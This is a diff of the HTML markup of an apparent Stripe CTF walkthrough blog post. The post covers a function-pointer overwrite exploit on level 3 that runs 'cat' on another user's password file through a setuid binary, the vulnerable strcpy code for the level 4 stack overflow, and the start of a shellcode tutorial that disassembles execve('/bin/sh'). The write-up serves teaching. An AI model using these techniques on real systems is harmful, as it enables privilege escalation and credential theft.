-  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="mh"&gt;0x80484ac&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p &amp;amp;run
+  (int (*)(const char *)) 0x80484ac
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;5) Stripe's machines were &lt;a href="http://en.wikipedia.org/wiki/Endianness"&gt;little-endian&lt;/a&gt; so the address of &lt;strong&gt;run&lt;/strong&gt; is &lt;strong&gt;\xac\x84\x04\x08&lt;/strong&gt;. We write the memory location of &lt;strong&gt;&amp;amp;run&lt;/strong&gt; into &lt;strong&gt;buf&lt;/strong&gt;, since &lt;strong&gt;buf&lt;/strong&gt; is just a &lt;code&gt;strcpy&lt;/code&gt; of the second argument. In the end, we want to call:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;\&lt;/span&gt;&lt;span class="n"&gt;xac&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x84&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x04&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x08&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ run&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\xac\x84\x04\x08&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;6) Running it with the length  of the directory (remember that the function pointer must start on a multiple of 4 characters) gives our password:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;levels&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level03&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;cat /home/level03/.password $(printf &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xac\x84\x04\x08&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ /levels/level03 -21 &lt;span class="s2"&gt;&amp;quot;cat /home/level03/.password &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;\xac\x84\x04\x08&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Level 4: Classic Stack Overflow&lt;/h2&gt;
 &lt;p&gt;Level 4 is about a classical  Stack Overflow problem. Once again we get a &lt;strong&gt;setuid&lt;/strong&gt; binary, together with the following code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;fun&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;void&lt;/span&gt; &lt;span class="nt"&gt;fun&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nt"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-  &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="err"&gt;char&lt;/span&gt; &lt;span class="err"&gt;buf&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="err"&gt;strcpy(buf,&lt;/span&gt; &lt;span class="err"&gt;str)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;main&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;int&lt;/span&gt; &lt;span class="nt"&gt;argc&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="nt"&gt;argv&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Usage: ./level04 STRING&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="p"&gt;}&lt;/span&gt;
-  &lt;span class="n"&gt;fun&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
-  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Oh no! That didn&amp;#39;t work!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="err"&gt;if&lt;/span&gt; &lt;span class="err"&gt;(argc&lt;/span&gt; &lt;span class="err"&gt;!=&lt;/span&gt; &lt;span class="err"&gt;2)&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="err"&gt;printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Usage&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;level04&lt;/span&gt; &lt;span class="n"&gt;STRING&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;);&lt;/span&gt;
+&lt;span class="s2"&gt;    exit(-1);&lt;/span&gt;
+&lt;span class="s2"&gt;  }&lt;/span&gt;
+&lt;span class="s2"&gt;  fun(argv&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;);&lt;/span&gt;
+&lt;span class="s2"&gt;  printf(&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Oh&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="n"&gt;That&lt;/span&gt; &lt;span class="n"&gt;didn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;work&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="err"&gt;return&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -246,7 +247,7 @@ chmod +x date
 &lt;h3&gt;Yet Another Shellcode Introduction&lt;/h3&gt;
 &lt;p&gt;Shellcode can either be crafted directly in Assembly, or reproduced in C and then disassembled in &lt;strong&gt;gdb&lt;/strong&gt; and &lt;strong&gt;objdump&lt;/strong&gt;. The second approach is more prone to errors.&lt;/p&gt;
 &lt;p&gt;Let's write the simplest shellcode we can think of, which simply spawns a shell:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
@@ -259,68 +260,68 @@ chmod +x date
 
 
 &lt;p&gt;With  the following &lt;strong&gt;Makefile&lt;/strong&gt; (I tend to write Makefiles for anything I compile in C):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simplest_shellcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;c&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simplest_shellcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;c&lt;/span&gt;
     &lt;span class="n"&gt;gcc&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;simplest_shellcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;c&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Running &lt;strong&gt;make&lt;/strong&gt; will give us our executable &lt;strong&gt;shell&lt;/strong&gt;.  Now, let's fire up &lt;strong&gt;gdb&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="nx"&gt;gdb&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;disas&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;
-&lt;span class="nb"&gt;Dump&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nb"&gt;code&lt;/span&gt; &lt;span class="nb"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d4&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;sub&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsp&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004d8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;movq&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004e0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;movq&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004e8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rax&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004ec&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;lea&lt;/span&gt;    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rcx&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004f0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004f5&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rsi&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004f8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;rdi&lt;/span&gt;
-   &lt;span class="mh"&gt;0x00000000004004fb&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;callq&lt;/span&gt;  &lt;span class="mh"&gt;0x40c540&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-   &lt;span class="mh"&gt;0x0000000000400500&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;
-   &lt;span class="mh"&gt;0x0000000000400505&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="nx"&gt;callq&lt;/span&gt;  &lt;span class="mh"&gt;0x400e60&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="nb"&gt;End&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nx"&gt;dump.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb shell
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
+Dump of assembler code &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; main:
+   0x00000000004004d0 &amp;lt;+0&amp;gt;: push   %rbp
+   0x00000000004004d1 &amp;lt;+1&amp;gt;: mov    %rsp,%rbp
+   0x00000000004004d4 &amp;lt;+4&amp;gt;: sub    &lt;span class="nv"&gt;$0&lt;/span&gt;x10,%rsp
+   0x00000000004004d8 &amp;lt;+8&amp;gt;: movq   &lt;span class="nv"&gt;$0&lt;/span&gt;x482be4,-0x10&lt;span class="o"&gt;(&lt;/span&gt;%rbp&lt;span class="o"&gt;)&lt;/span&gt;
+   0x00000000004004e0 &amp;lt;+16&amp;gt;:    movq   &lt;span class="nv"&gt;$0&lt;/span&gt;x0,-0x8&lt;span class="o"&gt;(&lt;/span&gt;%rbp&lt;span class="o"&gt;)&lt;/span&gt;
+   0x00000000004004e8 &amp;lt;+24&amp;gt;:    mov    -0x10&lt;span class="o"&gt;(&lt;/span&gt;%rbp&lt;span class="o"&gt;)&lt;/span&gt;,%rax
+   0x00000000004004ec &amp;lt;+28&amp;gt;:    lea    -0x10&lt;span class="o"&gt;(&lt;/span&gt;%rbp&lt;span class="o"&gt;)&lt;/span&gt;,%rcx
+   0x00000000004004f0 &amp;lt;+32&amp;gt;:    mov    &lt;span class="nv"&gt;$0&lt;/span&gt;x0,%edx
+   0x00000000004004f5 &amp;lt;+37&amp;gt;:    mov    %rcx,%rsi
+   0x00000000004004f8 &amp;lt;+40&amp;gt;:    mov    %rax,%rdi
+   0x00000000004004fb &amp;lt;+43&amp;gt;:    callq  0x40c540 &amp;lt;execve&amp;gt;
+   0x0000000000400500 &amp;lt;+48&amp;gt;:    mov    &lt;span class="nv"&gt;$0&lt;/span&gt;x0,%edi
+   0x0000000000400505 &amp;lt;+53&amp;gt;:    callq  0x400e60 &amp;lt;exit&amp;gt;
+End of assembler dump.
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The first line is updating the frame stack pointer (&lt;strong&gt;%rsp&lt;/strong&gt;), moving it to the top of the stack:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004d0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;    &lt;span class="n"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;
-&lt;span class="mh"&gt;0x00000000004004d1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;    &lt;span class="n"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00000000004004d0 &amp;lt;+0&amp;gt;:    push   %rbp
+0x00000000004004d1 &amp;lt;+1&amp;gt;:    mov    %rsp,%rbp
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Then it subtracts 16 bytes from &lt;strong&gt;%rsp&lt;/strong&gt;, with 8 bytes of padding:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004d4&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;    &lt;span class="n"&gt;sub&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;rsp&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00000000004004d4 &amp;lt;+4&amp;gt;:    sub    $0x10,%rsp
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We see this address &lt;strong&gt;0x482be4&lt;/strong&gt; being moved to &lt;strong&gt;%rsp&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004d8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;    &lt;span class="n"&gt;movq&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00000000004004d8 &amp;lt;+8&amp;gt;:    movq   $0x482be4,-0x10(%rbp)
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;It should be a pointer to &lt;code&gt;/bin/sh&lt;/code&gt;, and we can be sure by  asking gdb:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="mh"&gt;0x482be4&lt;/span&gt;
-&lt;span class="mh"&gt;0x482be4&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;    &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) x/1s 0x482be4
+0x482be4:    &amp;quot;/bin/sh&amp;quot;
 &lt;/pre&gt;&lt;/div&gt;
 
 
